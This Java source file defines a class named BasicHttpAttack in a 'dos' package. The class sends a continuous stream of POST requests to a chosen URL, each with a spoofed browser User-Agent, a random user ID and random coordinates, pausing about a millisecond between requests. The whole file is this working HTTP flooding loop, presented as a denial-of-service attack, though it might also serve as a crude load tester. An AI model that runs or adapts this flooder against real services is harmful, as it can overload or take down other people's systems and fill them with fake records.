/**
 * 
 */
package tikal.dos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;


/**
 * @author assafgannon
 *
 */
public class BasicHttpAttack implements Attack {

	private static final String CONTENT_TYPE = "application/json";

	private final String USER_AGENT = "Mozilla/5.0";
	
	URL url;
	volatile boolean running = false;
	
	@Override
	public void run() {
		Random random = new Random();
		running = true;
		while(running){
			try {
				HttpURLConnection con = (HttpURLConnection) url.openConnection();
 
				//add reuqest header
				con.setRequestMethod("POST");
				con.setRequestProperty("User-Agent", USER_AGENT);
				con.setRequestProperty("Content-Type", CONTENT_TYPE);
				con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
 
				String userId = java.util.UUID.randomUUID().toString();
				double latitude = 32d+random.nextDouble();
				double longitude = 34+random.nextDouble();
				String urlParameters = "{\"userId\":\""+userId+"\",\"latitude\":"+latitude+",\"longitude\":"+longitude+"}";
 
				// Send post request
				con.setDoOutput(true);
				DataOutputStream wr = new DataOutputStream(con.getOutputStream());
				wr.writeBytes(urlParameters);
				wr.flush();
				wr.close();
				
				int responseCode = con.getResponseCode();
				System.out.println("\nSending 'POST' request to URL : " + url);
				System.out.println("Post parameters : " + urlParameters);
				System.out.println("Response Code : " + responseCode);
		 
				//Sleep to prevent CPU hogging
				try {
					Thread.sleep(1);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				//gracefully shutdown
				running = false;
			}
	 
		}
	}

	@Override
	public void setUrl(String url) throws Exception {
		this.url = new URL(url);
		System.out.println(url);
	}
	
	@Override
	public void stop(){
		running = false;
	}

}
